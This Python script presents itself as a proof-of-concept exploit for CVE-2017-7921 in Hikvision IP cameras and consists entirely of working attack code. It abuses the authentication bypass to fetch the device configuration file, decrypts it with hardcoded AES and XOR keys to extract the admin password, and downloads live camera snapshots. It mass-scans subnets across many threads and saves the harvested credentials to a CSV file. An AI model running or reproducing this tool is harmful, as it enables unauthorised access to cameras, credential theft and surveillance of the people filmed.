import re
import requests
import argparse
import ipaddress
import csv
import os
import sys
import threading
import queue
from itertools import cycle
from Crypto.Cipher import AES
from alive_progress import alive_bar
from io import BytesIO
import time
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "BLUE": "\033[94m",
    "MAGENTA": "\033[95m",
    "CYAN": "\033[96m",
    "WHITE": "\033[97m",
    "BOLD": "\033[1m",
    "UNDERLINE": "\033[4m",
    "RESET": "\033[0m",
}

R = COLORS["RED"]
G = COLORS["GREEN"]
Y = COLORS["YELLOW"]
B = COLORS["BLUE"]
M = COLORS["MAGENTA"]
C = COLORS["CYAN"]
W = COLORS["WHITE"]
BO = COLORS["BOLD"]
U = COLORS["UNDERLINE"]
RS = COLORS["RESET"]

print("-------------------------------------------------------------------------")
print(f"{Y}[STAT]{RS} Coded by: K3ysTr0K3R")
print(f"{Y}[STAT]{RS} A PoC exploit for CVE-2017-7921 - Hikvision Information Disclosure")

def add_to_16(s):
    while len(s) % 16 != 0:
        s += b'\0'
    return s

def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
    key = bytes.fromhex(hex_key)
    ciphertext = add_to_16(ciphertext)
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")

def extract_tokens(data):
    chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
    pattern = re.compile(f'[{chars}]{{2,}}')
    return pattern.findall(data)

def find_admin_indices(tokens):
    return [i for i, token in enumerate(tokens) if token == 'admin']

def config_decryptor(data):
    try:
        decrypted = decrypt(data)
        xor_decrypted = xore(decrypted)

        try:
            decoded = xor_decrypted.decode('utf-8', errors='ignore')
        except:
            decoded = xor_decrypted.decode('ISO-8859-1', errors='ignore')
        tokens = extract_tokens(decoded)
        admin_indices = find_admin_indices(tokens)
        if not admin_indices:
            return None, None
        last_admin_idx = admin_indices[-1]
        if last_admin_idx < len(tokens) - 1:
            return 'admin', tokens[last_admin_idx + 1]
        return None, None
    except Exception:
        return None, None

def verify_vulnerability(host, port, timeout=10):
    headers = {'Connection': 'close', 'User-Agent': 'Mozilla/5.0'}
    formatted_host = f"[{host}]" if ':' in host and not host.startswith('[') else host
    user_url = f"http://{formatted_host}:{port}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{formatted_host}:{port}/System/configurationFile?auth=YWRtaW46MTEK"

    try:
        res = requests.get(
            user_url,
            timeout=timeout,
            verify=False,
            headers=headers
        )
        if res.status_code == 200 and all(k in res.text for k in ('userName', 'priority', 'userLevel')):
            config_res = requests.get(
                config_url,
                timeout=timeout * 2,
                verify=False,
                headers=headers
            )
            if config_res.status_code == 200:
                return config_res.content
    except requests.RequestException:
        pass
    return None

def capture_snapshot(host, port, timeout=10):
    formatted_host = f"[{host}]" if ':' in host and not host.startswith('[') else host
    snapshot_url = f"http://{formatted_host}:{port}/onvif-http/snapshot?auth=YWRtaW46MTEK"
    try:
        res = requests.get(
            snapshot_url,
            timeout=timeout,
            verify=False,
            stream=True
        )
        if res.status_code == 200 and 'image' in res.headers.get('Content-Type', ''):
            return res.content
    except requests.RequestException:
        pass
    return None

def parse_ports(port_str):
    ports = []
    for part in port_str.split(','):
        if '-' in part:
            start, end = map(int, part.split('-'))
            ports.extend(range(start, end + 1))
        else:
            ports.append(int(part))
    return ports

def parse_target(target):
    if '://' in target:
        target = target.split('://')[1]
    if '[' in target and ']' in target:
        host = target.split(']')[0] + ']'
        port_part = target.split(']')[1][1:]
        port = int(port_part) if port_part else 80
    elif ':' in target:
        parts = target.rsplit(':', 1)
        host = parts[0]
        port = int(parts[1]) if parts[1] else 80
    else:
        host = target
        port = 80
    return host, port

def exploit_target(host, port, timeout, output_dir):
    config_data = verify_vulnerability(host, port, timeout)
    if not config_data:
        return {
            'host': host,
            'port': port,
            'status': 'Not Vulnerable',
            'username': '',
            'password': '',
            'snapshot': ''
        }

    username, password = config_decryptor(config_data)

    if not username or not password:
        timestamp = time.strftime("%H:%M:%S")
        status = f'{R}Vulnerable (Creds Extraction Failed){RS}'
        print(f"{C}[{timestamp}]{RS} {Y}{host}:{port}{RS} - {status}")
        return {
            'host': host,
            'port': port,
            'status': 'Vulnerable (Creds Extraction Failed)',
            'username': '',
            'password': '',
            'snapshot': ''
        }

    timestamp = time.strftime("%H:%M:%S")
    status = f'{G}Vulnerable{RS}'
    print(f"{C}[{timestamp}]{RS} {Y}{host}:{port}{RS} - {status} - {B}Credentials:{RS} {G}{username}{RS}:{M}{password}{RS}")

    snapshot = capture_snapshot(host, port, timeout)
    snapshot_path = ''

    if snapshot:
        os.makedirs(output_dir, exist_ok=True)
        safe_host = host.replace(':', '_').replace('/', '_')
        safe_user = username.replace(':', '_').replace('/', '_')
        safe_pass = password.replace(':', '_').replace('/', '_')
        filename = f"{safe_host}-{port}-{safe_user}-{safe_pass}-snapshot.jpg"
        snapshot_path = os.path.join(output_dir, filename)
        with open(snapshot_path, 'wb') as f:
            f.write(snapshot)
        print(f"{C}[{timestamp}]{RS} {Y}{host}:{port}{RS} - {G}Snapshot saved{RS}: {C}{snapshot_path}{RS}")

    return {
        'host': host,
        'port': port,
        'status': 'Vulnerable',
        'username': username,
        'password': password,
        'snapshot': snapshot_path
    }

def write_results(results, output_file):
    with open(output_file, 'w', newline='') as csvfile:
        fieldnames = ['host', 'port', 'status', 'username', 'password', 'snapshot']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow(result)

def worker(target_queue, result_queue, timeout, output_dir):
    while True:
        try:
            host, port = target_queue.get(timeout=1)
        except queue.Empty:
            break

        try:
            result = exploit_target(host, port, timeout, output_dir)
            result_queue.put(result)
        except Exception as e:
            error_status = f'{R}Error: {str(e)}{RS}'
            timestamp = time.strftime("%H:%M:%S")
            print(f"{C}[{timestamp}]{RS} {host}:{port} - {error_status}")
            result_queue.put({
                'host': host,
                'port': port,
                'status': f'Error: {str(e)}',
                'username': '',
                'password': '',
                'snapshot': ''
            })
        finally:
            target_queue.task_done()

def main():
    parser = argparse.ArgumentParser(
        description=f'A PoC exploit for CVE-2017-7921 - Hikvision Information Disclosure',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('-u', '--url', help='Single target URL (ip:port or domain:port)')
    parser.add_argument('-f', '--file', help='File containing list of targets')
    parser.add_argument('-ip', '--ip', help='Single IP address or subnet (CIDR format)')
    parser.add_argument('-p', '--ports', default='80',
                        help='Port(s) to scan with --ip (comma-separated or ranges)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of concurrent threads')
    parser.add_argument('-timeout', '--timeout', type=int, default=10,
                        help='Request timeout in seconds')
    parser.add_argument('-od', '--output-dir', default='snapshots',
                        help='Output directory for snapshots')
    parser.add_argument('-o', '--output', default='results.csv',
                        help='Output CSV file for results')
    args = parser.parse_args()

    targets = set()

    if args.url:
        host, port = parse_target(args.url)
        targets.add((host, port))

    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        host, port = parse_target(line)
                        targets.add((host, port))
        except FileNotFoundError:
            print(f"{R}[-]{RS} Error: File {args.file} not found")
            sys.exit(1)

    if args.ip:
        ports = parse_ports(args.ports)
        try:
            network = ipaddress.ip_network(args.ip, strict=False)
            for ip in network.hosts():
                for port in ports:
                    targets.add((str(ip), port))
        except ValueError:
            for port in ports:
                targets.add((args.ip, port))

    if not targets:
        print(f"{R}[-]{RS} No targets specified. Use -u, -f, or -ip to specify targets.")
        sys.exit(1)

    print(f"{B}[INFO]{RS} Starting scan of {G}{len(targets)}{RS} targets")
    print(f"{B}[INFO]{RS} Using {C}{args.threads}{RS} threads with {C}{args.timeout}s{RS} timeout")
    print("-------------------------------------------------------------------------")

    target_queue = queue.Queue()
    result_queue = queue.Queue()

    for target in targets:
        target_queue.put(target)

    threads = []
    for _ in range(min(args.threads, len(targets))):
        t = threading.Thread(
            target=worker,
            args=(target_queue, result_queue, args.timeout, args.output_dir),
            daemon=True
        )
        t.start()
        threads.append(t)

    results = []
    with alive_bar(target_queue.qsize(), title=f'{C}Scanning Targets{RS}', bar='filling', spinner='waves', dual_line=True, enrich_print=False) as bar:
        while not result_queue.empty() or any(t.is_alive() for t in threads):
            try:
                result = result_queue.get(timeout=1)
                results.append(result)
                bar()
            except queue.Empty:
                if not any(t.is_alive() for t in threads):
                    break

    target_queue.join()
    write_results(results, args.output)
    print("-------------------------------------------------------------------------")
    print(f"\n{G}{B}[INFO]{RS} Results saved to: {C}{args.output}{RS}")
    print(f"{G}{B}[INFO]{RS} Snapshots saved to: {C}{args.output_dir}{RS}")

if __name__ == "__main__":
    main()
